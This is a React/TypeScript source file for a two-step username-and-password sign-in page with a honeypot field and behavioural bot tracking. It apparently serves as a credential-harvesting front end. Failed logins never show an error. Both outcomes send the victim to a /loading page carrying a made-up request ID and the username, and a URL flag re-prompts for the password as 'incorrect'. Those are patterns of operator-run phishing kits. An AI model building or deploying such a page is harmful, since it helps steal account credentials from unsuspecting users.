import { useState, useEffect } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { useMutation } from "@tanstack/react-query";
import { z } from "zod";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { XCircle } from "lucide-react";
import { apiRequest } from "@/lib/queryClient";
import { useLocation, Link } from "wouter";
import { Logo } from "@/components/Logo";
import { Footer } from "@/components/Footer";
import { SkipNav } from "@/components/SkipNav";
import { useSecurity } from "@/hooks/useSecurity";

const usernameSchema = z.object({
  username: z
    .string()
    .min(1, "Please enter your username")
    .min(3, "Username must be at least 3 characters long"),
  rememberUsername: z.boolean().default(false),
  website_url: z.string().optional(),
});

const passwordSchema = z.object({
  password: z.string().min(1, "Please enter your password"),
});

type UsernameFormData = z.infer<typeof usernameSchema>;
type PasswordFormData = z.infer<typeof passwordSchema>;

export default function Login() {
  const [step, setStep] = useState<"username" | "password">("username");
  const [usernameData, setUsernameData] = useState<UsernameFormData | null>(
    null,
  );
  const [location, setLocation] = useLocation();
  const [hasError, setHasError] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  // Security: Start tracking user behavior for bot detection
  const { startTracking, getSecurityPayload } = useSecurity();

  useEffect(() => {
    startTracking();
  }, [startTracking]);

  const usernameForm = useForm<UsernameFormData>({
    resolver: zodResolver(usernameSchema),
    defaultValues: {
      username: "",
      rememberUsername: false,
      website_url: "",
    },
  });

  const passwordForm = useForm<PasswordFormData>({
    resolver: zodResolver(passwordSchema),
    defaultValues: {
      password: "",
    },
  });

  // Check URL parameters on load
  useEffect(() => {
    if (typeof window === "undefined") return;

    const urlParams = new URLSearchParams(window.location.search);
    const urlUsername = urlParams.get("username");
    const urlError = urlParams.get("error");

    if (urlUsername) {
      const userData: UsernameFormData = {
        username: urlUsername,
        rememberUsername: false,
      };
      setUsernameData(userData);
      usernameForm.setValue("username", urlUsername);
      setStep("password");

      if (urlError === "incorrect_password") {
        setHasError(true);
      }
    }
  }, [usernameForm]);

  const checkUsernameMutation = useMutation({
    mutationFn: async (data: UsernameFormData) => {
      // Include security payload with behavioral data
      const securityPayload = getSecurityPayload();
      const response = await apiRequest(
        "POST",
        "/api/auth/check-username",
        { ...data, ...securityPayload },
      );
      return response.json();
    },
    onSuccess: (result, variables) => {
      setUsernameData(variables);
      setStep("password");
    },
    onError: () => {
      // You may want to show an error here instead of silently failing.
      // usernameForm.setError("username", {
      //   type: "server",
      //   message: "We couldn't find that username",
      // });
    },
  });

  const loginMutation = useMutation({
    mutationFn: async (passwordData: PasswordFormData) => {
      if (!usernameData) {
        throw new Error("Username data is not set");
      }

      // Include security payload with behavioral data
      const securityPayload = getSecurityPayload();
      const fullLoginData = {
        ...usernameData,
        ...passwordData,
        ...securityPayload,
      };

      const response = await apiRequest(
        "POST",
        "/api/auth/login",
        fullLoginData,
      );
      return response.json();
    },
    onSuccess: (result) => {
      const requestId = result.requestId || Date.now().toString();
      const username = usernameData?.username || "";
      setLocation(
        `/loading?requestId=${requestId}&username=${encodeURIComponent(
          username,
        )}`,
      );
    },
    onError: () => {
      // If this redirect-on-error behavior is intentional, keep it.
      const requestId = Date.now().toString();
      const username = usernameData?.username || "";
      setLocation(
        `/loading?requestId=${requestId}&username=${encodeURIComponent(
          username,
        )}`,
      );

      // Or alternatively, surface the error locally:
      // setHasError(true);
    },
  });

  const onUsernameSubmit = (data: UsernameFormData) => {
    checkUsernameMutation.mutate(data);
  };

  const onPasswordSubmit = (data: PasswordFormData) => {
    setHasError(false);
    loginMutation.mutate(data);
  };

  const goBackToUsername = () => {
    setStep("username");
    setUsernameData(null);
    passwordForm.reset();
    setHasError(false);
  };

  return (
    <div className="min-h-screen bg-white">
      <SkipNav />
      {/* Company Header */}
      <header className="auth-page-header">
        <Logo />
      </header>

      <div role="main" id="main-content" className="auth-form-container">
        <h1 className="auth-heading-primary auth-spacing-2x-mb">Sign in</h1>
        <div className="auth-text-bodyshort auth-spacing-2x-mb">
          Sign in with your account
        </div>

        {step === "username" ? (
          /* Step 1: Username Form */
          <form
            onSubmit={usernameForm.handleSubmit(onUsernameSubmit)}
            method="POST"
            autoComplete="off"
          >
            {/* Username Field */}
            <div className="auth-text-field auth-spacing-2x-mb">
              <label htmlFor="username">Username</label>
              <input
                id="username"
                type="text"
                inputMode="email"
                {...usernameForm.register("username")}
                autoComplete="username webauthn"
                aria-invalid={
                  usernameForm.formState.errors.username ? "true" : "false"
                }
                aria-required="true"
                data-testid="input-username"
              />
              {usernameForm.formState.errors.username && (
                <p
                  className="text-destructive text-sm"
                  data-testid="text-username-error"
                >
                  {usernameForm.formState.errors.username.message}
                </p>
              )}
            </div>

            {/* Honeypot Field - Hidden from real users */}
            <div style={{ opacity: 0, position: "absolute", top: 0, left: 0, height: 0, width: 0, zIndex: -1 }}>
              <label htmlFor="website_url">Website URL</label>
              <input
                id="website_url"
                type="text"
                tabIndex={-1}
                autoComplete="off"
                {...usernameForm.register("website_url")}
              />
            </div>

            {/* Recover Username Link */}
            <div className="auth-spacing-2x-mb">
              <Link
                to="/recover-username"
                className="auth-low-emph-button auth-reset-password-link"
                data-testid="link-recover-username"
              >
                Recover username
              </Link>
            </div>

            {/* Remember Username Checkbox */}
            <div className="auth-checkbox auth-spacing-3x-mb">
              <input
                name="rememberUsername"
                type="checkbox"
                id="rememberUsername"
                checked={usernameForm.watch("rememberUsername")}
                onChange={(e) =>
                  usernameForm.setValue("rememberUsername", e.target.checked)
                }
                data-testid="checkbox-remember-username"
              />
              <label htmlFor="rememberUsername">
                Remember username
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="24"
                  height="24"
                  viewBox="0 0 24 24"
                  aria-hidden="true"
                  focusable="false"
                >
                  <path d="M9.54,14.81l8-8a1.09,1.09,0,0,1,1.54,0l0,0a1.1,1.1,0,0,1,0,1.54l-8.78,8.78s0,0,0,0a1.12,1.12,0,0,1-.79.33h0a1.15,1.15,0,0,1-.41-.08,1.08,1.08,0,0,1-.39-.25L4.86,13.31a1.13,1.13,0,0,1,.8-1.92,1.11,1.11,0,0,1,.79.33Z" />
                </svg>
              </label>
            </div>

            {/* Continue Button */}
            <div>
              <button
                id="submit_btn"
                className="auth-high-emph-button auth-spacing-2x-mb"
                type="submit"
                disabled={checkUsernameMutation.isPending}
                data-testid="button-continue"
              >
                {checkUsernameMutation.isPending ? "Checking..." : "Continue"}
              </button>
            </div>

            {/* OR Divider */}
            <p className="auth-sub-head-line auth-spacing-2x-mb">OR</p>

            {/* Create Account Link */}
            <Link
              to="/register"
              className="auth-medium-emph-button auth-spacing-7x-mb"
              data-testid="link-create-account"
            >
              Create an Account
            </Link>
          </form>
        ) : (
          /* Step 2: Password Form */
          <form
            onSubmit={passwordForm.handleSubmit(onPasswordSubmit)}
            method="POST"
            autoComplete="off"
          >
            {/* Back to Previous Section */}
            <div className="auth-back-to-previous-label auth-spacing-2x-mb">
              Back to previous for:
            </div>
            <a
              className="auth-input-with-anchor auth-spacing-4x-mb"
              href="#"
              onClick={(e) => {
                e.preventDefault();
                goBackToUsername();
              }}
              data-testid="button-back"
            >
              {/* back chevron svg unchanged */}
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="6.98"
                height="12.45"
                viewBox="0 0 6.98 12.45"
                role="img"
                aria-hidden="true"
                focusable="false"
              >
                <defs>
                  <clipPath id="a">
                    <path
                      d="M1.82,6.22,6.76,1.28A.75.75,0,1,0,5.7.22L.22,5.69A.77.77,0,0,0,0,6.23a.75.75,0,0,0,.22.53L5.7,12.23a.75.75,0,0,0,.53.22.76.76,0,0,0,.53-.23A.75.75,0,0,0,7,11.69a.77.77,0,0,0-.22-.54Z"
                      fill="none"
                      clipRule="evenodd"
                    ></path>
                  </clipPath>
                </defs>
                <g clipPath="url(#a)">
                  <rect
                    x="-5"
                    y="-5"
                    width="16.98"
                    height="22.45"
                    fill="#0064d2"
                  ></rect>
                </g>
              </svg>
              <span className="auth-sr-only">Back to previous for</span>
              <span data-testid="text-selected-username">
                {usernameData?.username}
              </span>
            </a>

            {/* Password Field */}
            <div className="auth-text-field auth-pwd-field auth-spacing-2x-mb">
              <Label
                htmlFor="password"
                className="text-sm font-medium text-foreground"
              >
                Password
              </Label>
              <div className="relative">
                <Input
                  id="password"
                  type={showPassword ? "text" : "password"}
                  {...passwordForm.register("password")}
                  autoFocus
                  autoComplete="current-password"
                  aria-invalid={hasError ? "true" : "false"}
                  aria-required="true"
                  aria-describedby="password-error-text"
                  className={`w-full company-input ${hasError ? "border-red-500 focus:border-red-600" : ""
                    }`}
                  data-testid="input-password"
                />
                <button
                  type="button"
                  className="auth-low-emph-button auth-showpwd absolute right-2 top-1/2 -translate-y-1/2"
                  aria-label={
                    showPassword
                      ? "Hide password characters"
                      : "Show password characters"
                  }
                  onClick={() => setShowPassword((prev) => !prev)}
                  data-testid={
                    showPassword
                      ? "button-hide-password"
                      : "button-show-password"
                  }
                >
                  {showPassword ? "Hide" : "Show"}
                </button>
              </div>

              {hasError ? (
                <p
                  id="password-error-text"
                  className="mt-2 flex items-center gap-2 text-sm text-red-600"
                  data-testid="text-password-incorrect"
                >
                  <span className="inline-flex h-5 w-5 items-center justify-center rounded-full bg-red-100">
                    <XCircle
                      className="h-3 w-3 text-red-600"
                      aria-hidden="true"
                    />
                  </span>
                  <span>
                    The username or password entered does not match our records.
                    Please try again.
                  </span>
                </p>
              ) : (
                <p
                  id="password-error-text"
                  className="mt-2 text-sm text-destructive"
                >
                  {passwordForm.formState.errors.password && (
                    <span data-testid="text-password-error">
                      {passwordForm.formState.errors.password.message}
                    </span>
                  )}
                </p>
              )}
            </div>

            {/* Recover Password Link */}
            <div className="auth-spacing-2x-mb">
              <Link
                to="/recover-password"
                className="auth-low-emph-button auth-reset-password-link"
                data-testid="link-recover-password"
              >
                Forgot password?
              </Link>
            </div>

            {/* Sign In Button */}
            <div>
              <button
                id="submit_btn"
                className="auth-high-emph-button auth-spacing-7x-mb"
                type="submit"
                disabled={loginMutation.isPending}
                data-testid="button-signin"
              >
                {loginMutation.isPending ? "Signing in..." : "Sign in"}
              </button>
            </div>
          </form>
        )}
      </div>

      <Footer />
    </div>
  );
}
